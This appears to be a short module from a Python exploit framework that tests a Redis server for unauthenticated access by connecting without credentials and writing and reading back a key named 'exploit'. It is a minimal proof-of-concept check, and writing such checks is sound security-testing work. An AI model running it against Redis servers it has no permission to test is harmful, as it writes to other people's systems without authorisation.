from BaseExploit import *
import redis

def redis_unacc(host, port):
    pool = redis.ConnectionPool(host=host,port=port, decode_responses=True)
    r = redis.Redis(connection_pool=pool)
    r.set('exploit', str(time.time_ns()))
    r.get('exploit')

Exploit(redis_unacc, args.host, args.port)()
